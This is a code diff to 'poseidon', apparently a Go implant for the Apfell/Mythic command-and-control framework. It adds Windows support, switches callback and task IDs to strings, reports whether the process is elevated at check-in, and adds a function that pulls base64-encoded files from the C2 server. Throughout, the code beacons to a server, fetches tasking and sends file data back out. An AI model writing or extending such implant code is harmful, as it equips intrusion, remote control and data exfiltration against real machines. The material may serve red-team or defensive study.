@@ -1,4 +1,4 @@
-// +build default,linux darwin
+// +build default,linux darwin windows
 
 package profiles
 
@@ -17,6 +17,7 @@ import (
 	"time"
 
 	"github.com/xorrior/poseidon/pkg/utils/crypto"
+	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
@@ -27,7 +28,7 @@ type C2Default struct {
 	Interval       int
 	Commands       []string
 	ExchangingKeys bool
-	ApfellID       int
+	ApfellID       string
 	UserAgent      string
 	UUID           string
 	AesPSK         string
@@ -90,11 +91,11 @@ func (c *C2Default) SetXKeys(xkeys bool) {
 	c.ExchangingKeys = xkeys
 }
 
-func (c C2Default) ApfID() int {
+func (c C2Default) ApfID() string {
 	return c.ApfellID
 }
 
-func (c *C2Default) SetApfellID(newApf int) {
+func (c *C2Default) SetApfellID(newApf string) {
 	c.ApfellID = newApf
 }
 
@@ -140,6 +141,11 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 	checkin.IP = ip
 	checkin.Pid = pid
 	checkin.UUID = c.UUID
+	if functions.IsElevated() {
+		checkin.IntegrityLevel = 3
+	} else {
+		checkin.IntegrityLevel = 2
+	}
 
 	checkinMsg, _ := json.Marshal(checkin)
 	//log.Printf("Sending checkin msg: %+v\n", checkin)
@@ -164,6 +170,7 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 	respMsg := structs.CheckinResponse{}
 	err := json.Unmarshal(resp, &respMsg)
 	if err != nil {
+		log.Println("message:\n", string(resp))
 		log.Printf("Error in unmarshal:\n %s", err.Error())
 	}
 
@@ -174,7 +181,7 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 //GetTasking - retrieve new tasks
 func (c *C2Default) GetTasking() interface{} {
 	//log.Printf("Current C2Default config: %+v\n", c)
-	url := fmt.Sprintf("%sapi/v1.2/tasks/callback/%d/nextTask", c.BaseURL, c.ApfellID)
+	url := fmt.Sprintf("%sapi/v1.2/tasks/callback/%s/nextTask", c.BaseURL, c.ApfellID)
 	rawTask := c.htmlGetData(url)
 	//log.Println("Raw HTMLGetData response: ", string(rawTask))
 	task := structs.Task{}
@@ -189,7 +196,7 @@ func (c *C2Default) GetTasking() interface{} {
 
 //PostResponse - Post task responses
 func (c *C2Default) PostResponse(task structs.Task, output string) []byte {
-	urlEnding := fmt.Sprintf("api/v1.2/responses/%d", task.ID)
+	urlEnding := fmt.Sprintf("api/v1.2/responses/%s", task.ID)
 	return c.postRESTResponse(urlEnding, []byte(output))
 }
 
@@ -249,7 +256,7 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	}
 
 	if resp.StatusCode != 200 {
-		//log.Printf("Did not receive 200 response code: %d", resp.StatusCode)
+		//log.Printf("Did not receive 200 response code: %s", resp.StatusCode)
 		return make([]byte, 0)
 	}
 
@@ -380,10 +387,25 @@ func (c *C2Default) Download(task structs.Task, params string) {
 	c.SendFileChunks(task, raw)
 }
 
-//Upload the data
-func (c *C2Default) Upload(task structs.Task, fileid int) []byte {
+// Get a file
 
-	url := fmt.Sprintf("api/v1.2/files/%d/callbacks/%d", fileid, c.ApfellID)
+func (c *C2Default) GetFile(fileid string) []byte {
+	url := fmt.Sprintf("api/v1.2/files/%s/callbacks/%s", fileid, c.ApfellID)
+	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))
+
+	//decFileData := c.decryptMessage(encfileData)
+	if len(encfileData) > 0 {
+		rawData, _ := base64.StdEncoding.DecodeString(string(encfileData))
+		return rawData
+	}
+
+	return make([]byte, 0)
+}
+
+//Upload the data
+func (c *C2Default) Upload(task structs.Task, fileid string) []byte {
+
+	url := fmt.Sprintf("api/v1.2/files/%s/callbacks/%s", fileid, c.ApfellID)
 	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))
 
 	//decFileData := c.decryptMessage(encfileData)
@@ -440,7 +462,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 		tResp.Response = base64.StdEncoding.EncodeToString(encmsg)
 		dataToSend, _ := json.Marshal(tResp)
 
-		endpoint := fmt.Sprintf("api/v1.2/responses/%d", task.ID)
+		endpoint := fmt.Sprintf("api/v1.2/responses/%s", task.ID)
 		resp := c.htmlPostData(endpoint, dataToSend)
 		postResp := structs.FileChunkResponse{}
 		_ = json.Unmarshal(resp, &postResp)
